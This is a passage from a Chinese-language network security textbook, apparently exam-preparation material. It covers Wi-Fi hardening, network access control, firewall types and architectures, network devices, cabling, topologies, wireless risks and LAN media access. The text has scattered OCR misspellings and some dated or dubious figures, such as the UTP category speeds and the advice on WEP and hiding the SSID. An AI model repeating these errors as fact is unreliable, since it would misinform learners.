客户端重定向到强制门户访问控制页面。这个门户页面可能需要用户输入付款信息、提供登录凭据或输入访问代码。强制门户也被用来给用户显示可访问的使用策略、隐私策略和跟踪策略， 用户必须同意策略才能接入网络进行通信。 11.5.9 一般的Wi-Fi安全措施 改变默认的管理员密码。 关闭SSID广播。 变更SSID到特定的方式。 如果无线客户端比较少且是静态的， 启用MAC过滤。 考虑使用静态IP地址， 或配置保留的DHCP(仅适用于小型部署)。 开启支持的身份认证和加密的最高形式。如果不提供WPA2， 那么使用WPA和WEP提供非常有限的保护也比未加密的网络好得多。 把无线视为远程访问， 并使用802.1x进行访问管理。 把无线视为外部接入， 把WAP和有线网络用防火墙进行隔离。 把无线视为攻击者的入口， 用IDS监控所有WAP到有钱网络的通信流量。 需要对无线客户端和WAP之间的通信进行加密， 换句话说， 需要VPN连接。 11.6 保护网络组件 网络通常不被配置为单一的大集合系统。通常网络被分隔或细分成较小的组织单位。这些更小的单位、分组、分段或子网络(即子网)可以用来提高网络的各个方面: 提高性能 网络分隔可以通过组织方案提高性能， 这样经常通信的系统位于同一个网段， 而很少或无任何通信的系统位于其他网段。 减少通信 网络分隔往往能减少通信拥塞和容纳通信问题， 如广播风暴、单独的网络分段。 提高安全性 网络分隔可提高安全性， 可通过隔离数据流以及需要用户接入认证的网络段来加以实现。 可以通过基于交换机的VL刷、路由器或防火墙抑或它们的组合进行网络分隔。私有局域网或内部网、DMZ 和外部网都是网络分隔的类型。 11.6.1 网络接入控制 网络接入控制(NAC)是一种访问控制环境中通过严格遵守和实施安全策略的概念。NAC领域的目标如下: 预防/减少0-day攻击 加强网络通信的安全策略 使用验证完成访问控制 NAC 的目标可以通过使用强大且详细的安全策略来达到。这些措施明确了从客户端到服务器以及所有内部或外部沟通中每台设备的安全控制、过滤、预防、检测和响应。NAC作为一种自动检测和响应系统， 可以实时反应， 在威胁引起损坏或破坏之前就对其进行阻断。 NAC 可以通过进入前评估方式或进入后评估方式， 或结合这两种方式进行应用: 进入前评估方式需要系统满足当前的安全要求(如应用补丁和杀毒软件更新)才被允许与网络进行通信。 进入后评估方式基于用户的活动允许访问或拒绝访问， 是预定义的授权矩阵 其他围绕NAC的问题包括客户端/系统代理与整体网络监控(非代理); 带外与带内监测; 以及分解任何补救、隔离或强制门户策略。这些和其他的NAC问题必须在实施之前进行考虑和评估。 11.6.2 防火墙 防火墙是管理和控制网络通信的必要工具。防火墙是一种用于过滤通信的网络设备， 并且通常部署在专用网络与互联网的连接之间， 也可以部署在公司内的不同部门之间。防火墙基于己定义的一组规则(也被称为过滤器或访问控制列表)对通信进行过滤。这些规则本质上是一组指令， 这组指令被用于区分己授权的通信和非授权的或恶意的通信。只有己授权的通信才被允许通过防火墙所提供的安全屏障。防火墙被用于阻止或过滤通信。针对未请求的通信和从外部连接专用网络的企图， 以及基于内容、应用、协议、端口或源地址来阻止己知的恶意数据、消息或数据包， 防火墙都是最有效的。防火墙能够对公共网络隐藏专用网络的结构和寻址方案。大多数防火墙都提供广泛的日志记录、审计和监控性能， 以及警报和基本的入侵检测系统(IDS) 功能。 防火墙通常不能阻止通过其他己授权通信信道传送的病毒或恶意代码， 不能防止未授权的但由用户无意或有意造成的信息泄漏， 不能防范防火墙之后的恶意用户所进行的攻击， 也不能在数据离开或进入专用网络之后对其进行保护。不过， 可以通过特殊的插件模块或同类产品(例如， 防病毒扫描装置和IDS工具)来添加这些功能。这些防火墙设备可通过预设配置去执行所有(或大多数)附加功能。除了记录网络通信活动之外， 防火墙还应当记录下面这些事件: 防火墙的重启 无法启动的代理或依赖服务 崩溃或重新启动的代理或其他重要服务 对防火墙配置文件的更改 防火墙运行时的配置或系统错误 静态的数据包过滤防火墙 静态的数据包过滤防火墙通过检查报文头部的数据进行通信过滤。通常， 过滤规则关注于源地址、目的地址和端口地址。使用静态过滤时， 防火墙不能为用户提供身份认证， 也不能告知数据包来自专用网络内部还是外部， 并且很容易受到虚假数据包的欺骗。静态的数据包过滤防火墙被称为第一代防火墙， 在OSI模型的第3层(网络层)上工作。此外， 这种防火墙也被称为屏蔽路由器或常用路由器。 应用级网关防火墙 应用级网关防火墙也被称为代理防火墙。代理是一种可以将数据包从一个网络复制到另一个网络的机制: 为了保护内部或专用网络的身份， 复制过程还改变了源地址和目的地址。应用级网关防火墙基于用于传送或接收数据的网络服务(也就是应用)来过滤通信。每种应用类型都必须具有自己唯一的代理服务器。因此， 应用级网关防火墙包括很多独立的代理服务器。由于每个信息数据包在通过防火墙时都必须经过检查和处理， 因此这种类型的防火墙对于网络的性能会产生负面影响。应用级网关防火墙被称为第二代防火墙， 并且在OSI模型的应用层(第7层)上工作。 电路级网关防火墙 电路级网关防火墙用于在可信合作伙伴之间建立通信会话， 在OSI模型的会话层(第5层)上工作。SOCKS(来自安全套接字， 就像TCP/IP端口一样)是电路级网关防火墙的通用实现。电路级网关防火墙也称为电路代理， 在电路的基础上管理通信， 而不是基于通信的内容管理通信。这种防火墙只基于通信电路的终点名称(也就是源地址、目的地址以及服务端口号)来许可或拒绝转发决策。因为它们代表对应用级网关防火墙概念的更改， 所以电路级网关防火墙仍然被视为第二代防火墙。 状态检测防火墙 状态检测防火墙(也被称为动态包过滤防火墙)对网络通信的状态或环境进行评估。通过查看源地址和目的地址、应用习惯、起源地以及当前数据包与同一会话先前数据包之间的关系， 状态检测防火墙就能够为己授权的用户和活动授予广泛的访问权限， 并且能够积极地监视和阻止未授权的用户和活动。状态检测防火墙通常比应用级网关防火墙更有效。状态检测防火墙被视为第三代防火墙， 并且在OSI 模型的网络层和传输层(第3层和第4层)上工作。 1. 多宿主防火墙 某些防火墙系统具有多个接口。例如， 多宿主防火墙必须至少具有两个过滤通信的接口(具有两个接口的防火墙被称为双宿主防火墙)。应该禁用所有多宿主防火墙的IP转发功能， 以便使过滤规则控制所有通信， 而非允许接口之间存在软件支持的捷径。堡垒主机或屏蔽主机只是位于专用网络和不可信网络之间的防火墙系统。通常， 堡垒主机位于连接专用网络和不可信网络的路由器之后。所有入站通信都被路由至堡垒主机， 随后堡垒主机作为专用网络内所有可信系统的代理。堡垒主机不仅负责过滤进入专用网络的通信， 而且还负责保护内部客户端的身份。屏蔽子网位于两个路由器之间， 并且堡垒主机就位于这个子网内， 除此之外， 屏蔽子网与屏蔽主机(也就是堡垒主机)在概念上相似。所有入站通信都被定向至堡垒主机， 并且只有白堡垒主机代理的通信才能够通过第二个路由器进入专用网络。这种方式会创建一个子网，在该子网内， 某些外部访问者被允许与网络提供的资源进行通信。上面介绍的就是DMZ的概念， DMZ是一个被设计为外部访问者能够访问的网络区域， 不过这个区域仍然与组织的专用网络相隔离。DMZ常常是公共Web、电子邮件、文件以及其他资源服务器的宿主。 2. 防火墙部署的体系结构 防火墙部署的体系结构一般有三种:单层、双层和三层(也被称为多层)。 单层部署将专用网络置于防火墙之后， 防火墙通过路由器连接互联网(或者其他某些不可信网络)。单层部署只用于针对一般的攻击。这种体系结构只提供最低限度的保护。 双层部署体系结构可能采用两种不同的设计方式之一。一种设计使用一个具有三个或更多个接口的防火墙， 另一种设计则串联使用两个防火墙。这种体系结构允许存在一个DMZ或公共可访问的外部网。在第一种设计中， DMZ位于主防火墙的其中一个接口; 而在第二种设计中， DMZ位于两个串联的防火墙之间。DMZ用于驻留外部用户能够访问的信息服务器系统。防火墙根据其严格的过滤规则将通信路由至DMZ或可信网络。这种体系结构引入了中等级别的路由和过滤复杂性。 三层部署体系结构是在专用网络与互联网之间用防火墙隔离的多个子网部署。后续的每个防火墙都使用更严格的过滤规则， 只接受可信来源的通信。最外面的子网往往是DMZ。中间的子网可以作为事务处理子网， 在这种子网内， 系统需要支持在DMZ中驻留的复杂的Web应用程序。第三个或后端子网能够支持专用网络。这种体系结构是最安全的， 不过其设计、实现和管理也是最复杂的。 11.6.3 终端安全 终端安全的概念是指每个单独设备必须维护本地安全， 不论其网络或通信信道是否提供安全。传统的安全取决于网络的边界入口， 通过诸如应用防火墙、代理服务器、集中式病毒扫描程序，甚至是IDS/IPS/IDP解决方案来为网络中的所有内部节点提供安全保障。这已经不被认为是最佳行业实践， 因为内部威胁和外部威胁一样多。网络的安全取决于其最薄弱的元素。终端安全应视为在每个单独主机上提供足够安全努力的一个方面。每个系统都应该有合适的安全组合， 包含本地主机防火墙、反恶意软件扫描、身份认证、授权、审计和垃圾邮件过滤器以及IDS/IPS服务。 11.6.4 其他网络设备 中继器、集中器和放大器 中继器、集中器和放大器用于加强线缆段上的通信信号以及连接使用相同协议的网段。通过在较长的线缆上部署一个或多个中继器， 这些设备就能用于延长特定线缆类型的最大长度。中继器、集中器和放大器在OSI模型的第1层上工作。中继器、集中器或放大器两侧的系统都位于相同的冲突域和广播域内。 集线器 集线器用于连接多个系统以及连接使用相同协议的网段。它们将入站通信在所有出站端口上进行中继。这确保了通信将到达预计的主机。集线器是一种多端口的中继器， 它在OSI模型的第1层上工作。集线器两侧的系统都位于同一冲突域和广播域内。大多数组织有非集线器的安全策略来限制或减少窃听的风险， 因为集线器是一种过时的技术， 交换机己替代它们。 调制解调器 传统的陆线调制解调器(调制器-解调器)是一种通信装置， 其在模拟信号和数字信息之间进行覆盖或调制， 以支持在公共电话网络(PSTN)线路上进行计算机通信。在20世纪60年代到90年代中期， 调制解调器通常指广域网通信。调制解调器后来被包括ISDN、DSL 调制解调器、电缆调制解调器、802.11无线调制解调器以及各种形式的无线调制解调器的数字宽带技术替代。 桥 桥用于将两个网络(即使是拓扑结构、线缆连接类型和速度不同的网络)连接在一起， 以便连接使用相同协议的网段。桥将通信从一个网络转发至另一个网络。将使用不同传输速率的网络连接在一起的桥可以缓存数据包， 直至这些数据包被转发至较慢的网络， 这被称为存储转发设备。桥在OSI模型的第2层上工作。桥两侧的系统位于相同的广播域内， 不过所在的冲突域不同。 交换机 如果不使用集线器， 那么可以考虑使用交换机或智能集线器。交换机知道在每个出站端口上连接的系统的地址。与在所有出站端口上中继通信不同， 交换机只在己知存在的目的地所在的出站端口外对通信进行中继。交换机能够更有效地进行流量传递、建立隔离的冲突域以及提高数据的总体吞吐量。在用于创建VLAN时， 交换机也可以创建隔离的广播域。如果采用这样的配置，那么广播只允许在单个VLAN内， 不允许从一个VLAN顺利地穿越至另一个VLAN。交换机主要在OSI模型的第2层上工作。当交换机具有额外的功能时(如路由)， 那么也可以在OSI模型的第3层上工作(例如， 在VLAN之间进行路由的情况)。在第2层上工作的交换机， 其两侧的系统位于同一广播域内， 不过所在的冲突域不同。在第3层上工作的交换机， 其两侧的系统位于不同的广播域和冲突域内。交换机用于连接使用相同协议的网段。 路由器 路由器用于控制网络上的通信流， 井常用来连接相似的网络以及控制两者之间的通信流。路由器既可以利用静态定义的路由表进行工作， 也可以采用动态的路由系统。动态的路由协议有很多种， 例如RIP、OSPF和BGP。路由器在OSI模型的第3层上工作。路由器两侧的系统属于不同的广播域和冲突域。路由器用于连接使用相同协议的网段。 桥式路由器 桥式路由器是一种由路由器和桥组成的组合设备。桥式路由器首先尝试路由， 如果路由失败， 那么就默认进行桥接。因此， 桥式路由器主要在OSI模型的第3层上工作， 不过必要时也可以在第2层上工作。在第3层上工作的桥式路由器， 其两侧的系统位于不同的广播域和冲突域内。在第2层上工作的桥式路由器， 其两侧的系统位于相同的广播域内， 不过所在的冲突域不同。桥式路由器用于连接使用相同协议的网段。 网关 网关能够连接使用不同网络协议的网络。通过将通信的格式转换为与每个网络采用的协议或传输方法都兼容的形式， 网关就可以负责从一个网络向另一个网络传输通信信息。网关也被称为协议转换器， 既可以作为独立硬件设备， 也可以作为一种软件服务(例如， IP-to-IPX网关)。网关两侧的系统位于不同的广播域和冲突域内。网关用于连接使用不同协议的网段。网关具有很多类型，包括数据、邮件、应用、安全和互联网。网关通常在OSI模型的第7层上工作。 代理 代理是一种不需要在协议之间进行转换的网关。相反， 代理能够充当网络的中介、过滤器、缓存服务器甚至NATIPAT服务器。代理代表另一个系统执行操作或请求服务， 并且连接使用相同协议的网段。代理最常被用于为专用网络中的客户端提供互联网访问， 同时又保护客户端身份的环境中。代理从客户端接受请求， 更改请求者的源地址， 维持与客户端请求的映射， 并且将更改过的请求数据包发出。这种机制就是通常所说的网络地址转换(NAT)。一旦接收到回应， 代理服务器就会通过查看映射来决定预定的客户端， 然后将数据包发送给该客户端。代理两侧的系统位于不同的广播域和冲突域内。 LAN扩展 LAN扩展是一种远程访问的多层交换机， 用于通过WAN 链接连接远距离网络。令人奇怪的是， LAN扩展会创建WAN， 但是经销商却避开使用WAN术语， 而是只使用LAN和扩展的LAN来称呼这种设备。之所以这样做的原因是: 标准的W剧设备与复杂的概念和术语联系在一起， 采用LAN术语能够使人们更容易理解这种设备， 并且更容易开展营销工作。最终， LAN扩展是与WAN交换机或WAN路由器相同的产品(我们同意Douglas Adams的观点， 他坚信应当用宇宙飞船将销售人员、律师和电话推销人员运送到宇宙的最远端) 。 11.7 布线、无线、拓扑和通信技术11.7.1 网络布线1. 同轴电缆 同轴电缆(coaxial cable 或coax)是20世纪70年代和80年代流行的网络连线类型。同轴电缆的中心是一根铜线， 外面包着一层绝缘物质， 再往外是一层导电的编织屏蔽物， 并且由最外面的绝缘外皮包裹着。由于线缆中央的铜芯和编织屏蔽层作为两根独立的导线， 因此准许在同轴电缆上进行双向通信。同轴电缆的设计使其能够完全抵抗电磁干扰(EMI)， 能够支持高带宽(对比同时代的其他技术)， 并且提供比双绞线更长的可用长度。同轴电缆需要使用网段终结器， 而双绞线则不需要。同轴电缆具有两种主要类型: 细缆和粗缆。细缆也被称为10Base2， 通常用来将系统连接到粗缆主干线路。细缆可以扩展到185米的距离， 并且能够提供高达10Mbps的吞吐率。粗缆也被称为10Base5， 可以扩展到500米的距离， 并且能够提供高达10Mbps的吞吐率。同轴电缆的常见问题如下: 同轴电缆的弯曲会超出最大弧形半径， 从而破坏中心导线 部署同轴电缆的长度超过推荐的最大长度(10Base2的最大长度为185米， 10Base5的最大长度为500米) 在同轴电缆末端没有正确使用50欧姆电阻器 2. 基带和宽带线缆 标记大多数网络连线技术所使用的命名规则都道，从语法”XXyyyyZZ”。XX表示线路类型所提供的最大速度， 例如10Base2线路提供的最大速率为10MbPS。yyyy表示线路的基带或宽带特性，例如10Base2线缆的基带特性。基带线缆一次只能传输一个单独的信号， 宽带线缆则可以同时传输多个信号。绝大多数网络连线都采用基带线缆。然而， 在特定的配置中使用时， 同轴电缆可以被用作宽带连接， 例如线缆调制解调器。ZZ既可以表示线缆所能提供的最大应用距离， 也可以表示线缆技术的速记形式， 例如10Base2线缆可以提供大约200米的距离(实际上是185米，近似为200米)，10Base-T或100Base-TX中的T或四表示双绞线(需要注意的是， 100Base-TX使用两条5类UTP或STP线路实现， 一条用于接收， 另一条用于发送)。 3. 双绞线 与同轴电缆相比， 双绞线相当细， 而且非常灵活。双绞线由4对线缆组成， 这4对线双绞在一起， 并且被包在PVC绝缘皮内。如果在外皮之下、线缆的周围包有一层金属箔片， 那么这条线就被称为屏蔽双绞线(STP)。这层金属箔片对外部EMI提供了额外保护。没有这层金属箔片的双绞线被称为非屏蔽双绞线(UTP)。 UTP和STP的线缆由细铜线组成， 它们被成对地双绞在一起。线缆的缠绕可以使线缆免受外部的无线电频率干扰、电子干扰和磁性干扰， 并且降低了线对之间的串扰。由于电流会产生电磁辐射，因此一组线会被另一组线感应， 这样在数据传输时就会发生串扰。线缆中的每个线对都以不同的程度进行缠绕(也就是每英寸距离内进行缠绕) ， 这样当信号在一对线上传递时， 就不会交错到另一对线上。缠绕得越紧(每英寸进行的缠绕越多)， 那么对内部和外部干扰以及串扰的屏蔽也就越强， 因此吞吐的能力也就越大(也就是说， 具有更大的带宽)。UTP线缆有几种类型。不同的种类来自于使用的线对缠绕的松紧、导线的质量和外部绝缘层的质量，如下： UTP类别 吞吐率 说明 1类 只用于语音 不适用于网络， 但是可用于调制解调器 2类 4Mbps 不适用于大多数网络， 常常用于大型机中的主机到终端的连接 3类 10Mbps 主要用于10Base-T以太网(在令牌环网中只提供4Mbps的吞吐率) 4类 16Mbps 主要用于令牌环网 5类 100Mbps 用于10Base-TX、FDDI和ATM网络 6类 155Mbps 用于高速网络 7类 10Gbps 用于千兆速率的网络 下面列出了使用双绞线的最常见问题: 使用错误的双绞线线缆类型来完成高吞吐率的网络连接 部署的双绞线线缆长度超过推荐的最大长度(也就是100米) 在具有显著干扰的环境中使用UTP 4. 导线 导线型网络线缆的距离受到金属导线电阻的限制。作为最常用的导线， 铜线是最好、最便直的可用于室温环境下的一种导线。然而， 铜线对于电流还是存在电阻， 这使得信号的强度和质量在超出线缆的长度时会降低。每种线缆类型定义的最大长度， 指的是在哪一点信号降低的程度开始对数据传输的有效性产生干扰。信号的这种降低被称为衰减。在使用中， 结缆的长度常常可能超出定额， 但是错误和重传的数量将在这条线缆上增加， 最终会导致网络的性能变得很差。随着传输速率的提高， 衰减将表现得更加显著。如果要提高传输速率， 建议大家使用较短的线缆。 距离长的钱缆常常可以通过使用中继器或集中器得到补充。中继器是一个信号放大设备， 它更像是车载或家用录音机的放大器。中继器将输入数据流的信号强度增大， 然后从它的另一个端口重新广播出去。除了具有两个以上的端口之外， 集中器与中继器进行同样的操作。但是， 连续使用的中继器不能多于4个。 11.7.2 网络拓扑 环型拓扑结构 环型拓扑结构将每个系统像圆周上的点一样连接在一起。连接介质像一条单向的传输环。每次只有一个系统可以传输数据。传输管理通过一个令牌实现。令牌是一个数字通行证， 它绕着环运动， 直至被系统捕获。拥有令牌的系统能够传输数据。数据和令牌被传送到特定的目的地。在数据绕环传递时， 每个系统都要查看自己是否就是数据的预定接收者。如果不是， 则继续传递令牌。如果是， 则读取数据。一旦数据被接收， 令牌即被释放， 并且返回到环中继续绕行， 直到被另一个系统捕获。如果环中的任意一段出现故障， 那么所有的绕环通信都将终止。为了防止单点故障， 某些环型拓扑结构的实现采用了容错机制， 例如反向运行的双环。 总线型拓扑结构总线型拓扑结构将每个系统都连接到一条主干线或骨干线。总线上所有的系统都可以同时传输数据， 这样就可能导致突。当两个系统同时传输数据时， 就会出现冲突， 信号会相互产生干扰。为了避免这种情况的发生， 系统采用冲突避免机制， 这种机制主对当前其他任意的通信进行”侦昕”。如果侦听到通信， 那么系统会等待片刻并再次进行侦听。如果没有侦听到通信， 那么系统就传输其数据。当数据在总线型拓扑结构上进行传输时，网络上的所有系统都在侦昕这些数据。如果数据的目的地址不是某个特定的系统， 那么该系统就会忽略这个数据。总线型拓扑结构的好处在于， 如果单个网段出现了故障， 那么其他所有网段上的通信仍然能够继续进行而不被中断。不过， 中央干线仍然存在着单点故障隐患。总结型拓扑结构有两种类型: 线型和树型。线型总线型拓扑结构采用单条主干线路， 所有的系统都直接连接到干线上。树型总线型拓扑结构采用单条主干线路， 其分支可以支持多个系统。总线在今天很少使用的主要原因是: 它必须在两端有终接器并且在整个网络中容易出现断网的情况。 星型拓扑 星型拓扑结构采用了一个集中式连接设备， 这个设备可以是一台简单的集线器或交换机。每个系统都通过一个专用的网段连接到中央集线器。如果任意一个网段出现故障， 那么其他网段仍然可以继续运作。然而， 中央的集线器却是一个单点故障点。总的来说， 星型拓扑结构使用了比其他拓扑结构更少的线缆连接， 并且更容易确定受损的线缆。一条逻辑总线和一个逻辑环可以被实现为一个物理的星型拓扑结构。以太网是基于总线的技术，它可以被部署为一个物理的星型拓扑结构， 但是集线器设备实际上是逻辑总线连接设备。同样， 令牌环是基于环的技术， 它可以通过使用多站访问部件(Multistation Access Unit， MAU)被部署为一个物理的星型拓扑结构。MAU准许线缆段被部署为星型， 同时以内部的设备形成逻辑环连接。 网状型拓 扑结构网状型拓扑结构使用很多路径将一个系统与其他系统连接在一起。全交叉拓扑结构将每个系统与网络中的其他所有系统都连接在一起。部分交叉拓扑结构将很多系统连接到其他很多系统。网状型拓扑结构为系统提供了冗余连接， 这样， 即使多个网段出现故障， 也不会对连通性造成严重的影响。 11.7.3 无线通信与安全性1. 无线的一般概念 无线通信使用无线电波远距离传输信号。无线电波频谱是有限的， 因此对其使用时必须进行适当的管理， 从而保证在没有干扰或干扰很小的情况下允许多个使用同时存在。无线电波频谱使用频率进行测量或区分。用频率测量波在特定时间内振动的次数(使用单位Hz进行确定)或者每秒的振动次数。无线电波的频率在3Hz到300GHz之间。不同的频率范围被分配给特定的用途。 扩频指的是通信可以通过多个频率同时发生。因此， 一条报文可以被分为若干片段， 所有片段同时进行发送， 不过每个片段都使用不同的频率。实际上， 这是一种并行通信而不是串行通信。 跳频扩频(Frequency Hopping Spread Spectrum， FHSS)是扩频概念的早期实现。然而， 这种技术并非以并行方式发送数据， 而是以串行方式传输数据， 同时不断改变所使用的频率。可用频率的整个范围都会被使用， 但是每次只使用一个频率。发送者改变频率时， 为了接收到信号， 接收者必须遵循相同的跳频模式。FHSS被设计用于帮助最小化干扰， 而不是只使用会受到影响的单一频率。在实际使用中， 通过不断切换频率， 干扰就被最小化。 直接序列扩频(Direct Sequence Spread Spectrum， DSSS) 以并行方式同时利用所有可用频率。与FHSS相比， DSSS提供了更高的数据吞吐率。DSSS也使用被称为碎片码的特殊编码机制来允许接收方重构数据， 即使是部分信号由于干扰被破坏也同样适用。这种情况与RAID-5的奇偶位允许重新创建所丢失驱动器上的数据几乎完全相同。 正交频分复用(Orthogonal Frequency-Division Multiplexing， OFDM)仍然是另一种频率使用的变化形式。OFDM利用了允许传输进行更紧密压缩的数字多载波调制模式。已调制信号是正交的， 因此不会导致相互干扰。最后， OFDM需要的频率组(也就是信道带宽)更小， 却能够提供更大的数据吞吐率。 2. 蜂窝电话 蜂窝电话无线通信会通过使用特定无线电波频率组的便携设备与蜂窝电话运营商的网络以及其他蜂窝电话设备或互联网交互。蜂窝电话所使用的技术很多， 而且往往会引起混淆。一个比较容易混淆的地方是2G和3G术语的使用。并非所有蜂窝电话通信数据都是语音: 蜂窝电话常常被用于传输文本甚至计算机数据。其次， 对于蜂窝电话提供商网络上的通信， 不管是语音、文本还是数据， 都不一定是安全的。再次， 使用特定的无线嗅探装备能够截获蜂窝电话传输的信息。实际上， 连接的服务商基站能够被模拟进而导致中间人攻击。最后， 如果使用蜂窝电话连通性访问互联网或办公网络， 那么攻击者甚至还可能获得其他的攻击、访问和破坏手段。这些设备中的一些能潜在地成为网桥， 进而创建一条不安全的通道来进入你的网络。 无线应用协议(Wireless Application Protocol， WAP)o WAP不是一个标准， 而是一个功能行业驱动的协议枝。借助具备WAP能力的设备， 从蜂窝电话或PDA通过互联网上的蜂窝电话运营商网络和网关接入公司网络， 用户就能够与公司网络通信。WAP是一套共同工作的协议族， 其中无线传输层安全(Wireless Transport Layer Security， WTLS)协议能够提供与SSL或TLS相似的安全连通性服务。 3. 蓝牙(802.15) 蓝牙或IEEE 802.15 个人局域网(PAN)是与无线安全性有关的另一个区域。蜂窝电话的听筒、麦克风、鼠标、键盘、GPS设备以及其他许多接口设备和外围设备都通过蓝牙连接。被称为蓝牙劫持的技术能够在仿刁三知’惰的情况下配对你的设备， 并且可以使用这些设备， 或者可以从这些设备中提取信息。这种攻击形式能够使攻击者访问你的联系人列表、数据甚至谈话。蓝牙窃听这种攻击允许黑客远程控制蓝牙设备的特性和功能。这可能包括打开麦克风的能力， 使用手机作为音频监控。幸运的是， 蓝牙通常只具有30英尺的限定范围， 不过某些设备在100米之外也能够运作。虽然蓝牙使用了加密， 但并不是动态加密， 而且往往通过适当的工作就能够破解。蓝牙用于非敏感或非机密的活动。只要有可能， 最好修改设备的默认PIN。不要使设备停留在发现模式， 在没有活动使用时总是关闭蓝牙。 4. 无绳电话 无绳电话存在往往被忽视的安全问题。无绳电话被设计使用任何一个免执照频率(也就是900MHz、2.4GHz或5GHz)。许多不同类型的设备都使用了这三个免执照频率， 包括无绳电话、婴儿监视器、蓝牙设备和无线网络连接设备。常常被忽视的问题是: 因为信号极少加密， 所以无绳电话很容易被偷听。使用频率扫描仪， 任何人都能够监听你的谈话。 5. 移动设备 移动设备通常支持内存卡， 并且可能会将恶意代码注入或将机密数据带出企业。许多移动设备还支持USB 连接桌面终端或笔记本电脑以进行同步通信， 例如传输文件、文档、音乐、视频等。设备本身通常包含敏感数据， 例如通信录、短信、电子邮件， 甚至记录和文件。移动设备的遗失或失窃意味着个人和企业机密的破坏。移动设备己成为黑客和恶意代码的攻击目标。不在移动设备上保存敏感信息是十分重要的。在设备上运行防火墙和防病毒产品(如果可提供的话)并且保持系统锁定或加密(如果可行的话)。 11.7.4 LAN 技术1. 以太网 以太网是一种共享介质的LAN 技术， 也称为广播技术。这意味着它准许很多设备在相同的介质上进行通信， 但是要求每台设备轮流通信并且执行冲突检测和避免操作。以太网采用广播域和冲突域。广播域是一个物理的系统组， 这个组中的所有系统成员都会接收到由组中单个系统发送的广播。广播是传输到特定地址的消息， 它指示所有的系统都是预计的接收者。冲突域包含若干系统组， 在冲突域内， 如果两个系统同时进行传输， 就会发生数据冲突。当两条被传输的消息企图同时使用网络介质时， 就会出现数据冲突， 这会导致其中一条或两条消息出现说误。以太网可以支持全双工通信(也就是完全双向的通信)， 并且往往使用同轴电缆或双绞线连接。以太网最常在星型或总线型拓扑上部署。 2. 令牌环 令牌环来用令牌传递机制来控制哪些系统可以在网络介质上传输数据。令牌在LAN 所有成员形成的逻辑环上进行传递。令牌环可以来用环型或星型网络拓扑。由于令牌环的性能有限， 比起以太网来说成本又高， 而且会增加部署和管理的难度， 今天己极少使用。令牌环可通过使用多站访问组件(MAU)部署物理星型结构。MAU允许电缆段部署为星型结构，同时内部设备使用逻辑令牌连接。 3. 光纤分布式数据接口(FDDI) 光纤分布式数据接口(FDDI)是一种使用两个环的高速令牌传递技术，其中信息流在两个环上沿相反的方向传输。FDDI常用作大型企业网络的主干， 它的双环设计允许实现自愈， 即从环中去除故障网段， 并且利用剩下的部分内部环和外部环建立单个环。虽然FDDI价格昂贵， 但是在快速以太网和千兆以太网出现之前常常被用在校园环境中。价格稍便直、距离有限且速度更慢的版本称为铜线分布式数据接口(CDDI)。CDDI也更容易遭到干扰和偷听。 4. 辅助技术 大多数网络并非只包含一种技术， 而是包含众多技术。例如， 以太网并不只是一个单独的技术，而是支持其通用以及预期活动和行为的多个辅助技术的超集。以太网包括数字通信、同步通信和基带通信技术， 并且支持广播、多播和单播通信以及带有冲突检测的载披侦昕多路存取(Carrier-Sense Multiple Access with Collision Detection ， CSMA/CD)。许多LAN技术， 例如以太网、令牌环和FDDI都可能包括下面所介绍的辅助技术。 5. 模拟和数字 对于许多网络通信形式来说， 常见的一种辅助技术是在物理介质(例如， 线缆)上实际传输信号所使用的机制。传输机制分为两种类型:模拟和数字。 使用频率、幅度、相位、电压等发生变化的连续信号时，就会进行模拟通信。连续信号的差异会产生波形(与数字信号的方波形成对照)。连续信号的差异导致实际通信的发生。 通过使用非连续的电子信号以及状态改变或开关脉冲， 就会出现数字通信。 6. 同步和异步 某些通信使用时钟或定时活动进行同步。通信既可以是同步的， 也可以是异步的。 同步通信依赖于定时或时钟机制， 这种机制基于独立的时钟或数据流内嵌的时间标记。同步通信通常能够支持非常高速的数据传送。 异步通信依赖于停止和开始定界位来管理数据的传输。因为使用了定界位以及传输的停止和开始特征， 所以异步通信最适用于数据量较少的传输。公用电话交换网(PSTN)调制解调器就是异步通信的一个绝佳示例。 7. 基带和宽带 在一个线缆段上能够同时发生的通信数取决于使用的是基带技术还是宽带技术。 基带技术只能支持单个通信信道， 它使用直流电应用于线缆， 其中有电流表示二进制信号1，无电流表示二进制信号0。基带是一种数字信号形式。以太网就是基带技术。 宽带技术能够支持多个同时发生的信号。宽带使用频率调制来支持许多信道， 每个信道都支持一个截然不同的通信会话。宽带适用于高吞吐率， 尤其适用于若干信道复用的情况。宽带是一种模拟信号形式。有线电视和线缆调制解调器、ISDN、DSL、T1以及T3都是宽带技术的示例。 8. 广播、多播和单播 另一种辅助技术确定了单个传输能够到达的目的地数量， 具体的选项是广播、多播和单播。 广播技术支持与所有可能的接收者进行通信。 多播技术支持与多个特定的接收者进行通信。 单播技术只支持与某个特定接收者的单一通信。 9. LAN介质访问 载波侦昕多路存取(CSMA) CSMA并不直接解决冲突。如果发生冲突， 那么通信就不成功， 因此也不会接收到确认信号。这样会导致发送系统重新传输数据和重新执行CSMA过程。这是一种使用下列步骤进行通信的LAN介质访问技术: (1) 主机侦听LAN 介质， 从而确定LAN 介质是否正在使用。 (2) 如果LAN 介质未被使用， 那么主机就传输其通信数据。 (3) 主机等待确认信号。 (4) 如果超时未接收到确认信号， 那么主机从步骤(1)开始重新执行操作。 带有冲突避免的载波侦昕多路存取(CSMA/CA) AppleTalk和802.11无线网络连接是利用CSMA/CA技术的网络例子。CSMA/CA试图通过在任意指定时间内只授予单个通信特权来避免冲突。CSMA/CA系统要求指定一个主系统， 这个主系统能够响应请求以及授予发送数据传输的特权。这是一种使用下列步骤进行通信的LAN介质访问技术: (1) 主机具有两个与LAN介质的连接: 入站连接和出站连接。主机侦昕入站连接， 从而确定LAN介质是否正在使用。 (2) 如果LAN介质未被使用， 那么主机就请求传输特权。 (3) 如果超时之后仍未获得特权， 那么主机从步骤(1)开始重新执行操作。 (4) 如果被授予特权， 那么主机就通过出站连接传输其通信数据。 (5) 主机等待确认信号。 (6) 如果超时之后仍未收到确认信号，那么主机从步骤(1)开始重新执行操作。 带有冲突检测的载波侦昕多路存取(CSMA/CD) 以太网利用了CSMA/CD技术。通过使冲突域的每个成员在重新开始传输过程之前都进行随机的短时间等待， CSMA/CD可以响应冲突。遗憾的是， 准许冲突发生以及随后对冲突的响应或反应会导致传输延迟以及要求重复传输， 这会导致损失40%左右的潜在吞吐量。这是一种使用下列步骤进行通信的LAN介质访问技术: (1) 主机侦昕LAN介质， 从而确定LAN 介质是否正在使用。 (2) 如果LAN介质未被使用， 那么主机就传输其通信数据。 